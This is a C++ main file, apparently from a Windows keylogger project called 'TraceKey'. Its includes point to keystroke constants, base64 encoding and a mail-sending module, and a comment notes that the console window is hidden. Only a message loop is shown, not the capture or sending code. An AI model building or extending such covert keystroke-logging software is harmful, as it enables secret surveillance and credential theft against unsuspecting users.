#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "KeyConstants.h"
#include "base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"

using namespace std;

int main() {


    // TraceKey uses -mwindow flag for hiding the cosole window
    MSG msg; // message struct - https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-tagmsg
    while(GetMessage(&msg, NULL, 0, 0)) {   // from the thread's message queue, NULL - associated window
        TranslateMessage(&msg); // translate and post message to message queue
        DispatchMessage(&msg);  // dispatch message to a window
    }

    return 0;
}
